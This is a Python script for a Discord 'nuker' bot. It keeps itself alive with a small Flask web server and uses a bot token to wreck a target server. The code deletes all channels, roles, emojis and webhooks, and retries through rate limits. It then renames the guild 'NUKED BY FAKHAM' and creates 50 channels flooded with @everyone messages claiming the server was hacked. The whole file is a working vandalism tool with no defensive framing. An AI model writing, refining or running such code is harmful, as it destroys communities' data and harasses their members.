import os
import requests
import time
import threading
from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web_server():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("BOT_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")
BASE_URL = "https://discord.com/api/v9"
HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}

def send_request(method, url, json=None):
    while True:
        r = method(url, headers=HEADERS, json=json)
        if r.status_code == 429:
            retry_after = r.json().get("retry_after", 1)
            time.sleep(retry_after)
        else:
            return r

def nuke_operations():
    def delete_channels():
        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/channels", headers=HEADERS)
        if r.status_code == 200:
            for ch in r.json():
                send_request(requests.delete, f"{BASE_URL}/channels/{ch['id']}")

    def delete_roles():
        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/roles", headers=HEADERS)
        if r.status_code == 200:
            for role in r.json():
                if role['name'] != "@everyone" and not role['managed']:
                    send_request(requests.delete, f"{BASE_URL}/guilds/{GUILD_ID}/roles/{role['id']}")

    def delete_emojis():
        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/emojis", headers=HEADERS)
        if r.status_code == 200:
            for e in r.json():
                send_request(requests.delete, f"{BASE_URL}/guilds/{GUILD_ID}/emojis/{e['id']}")

    def delete_webhooks():
        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/webhooks", headers=HEADERS)
        if r.status_code == 200:
            for w in r.json():
                send_request(requests.delete, f"{BASE_URL}/webhooks/{w['id']}")

    def mass_create_and_spam(count, name, msg):
        for i in range(count):
            res = send_request(requests.post, f"{BASE_URL}/guilds/{GUILD_ID}/channels", {"name": f"{name}-{i}", "type": 0})
            if res.status_code == 201:
                channel_id = res.json()['id']
                for _ in range(3):
                    send_request(requests.post, f"{BASE_URL}/channels/{channel_id}/messages", {"content": msg})

    def change_name(new_name):
        send_request(requests.patch, f"{BASE_URL}/guilds/{GUILD_ID}", {"name": new_name})

    delete_channels()
    delete_roles()
    delete_emojis()
    delete_webhooks()
    change_name("NUKED BY FAKHAM")
    mass_create_and_spam(50, "nuked", "@everyone تم التهكير من فخم")

if __name__ == "__main__":
    threading.Thread(target=run_web_server).start()
    if TOKEN and GUILD_ID:
        nuke_operations()
        
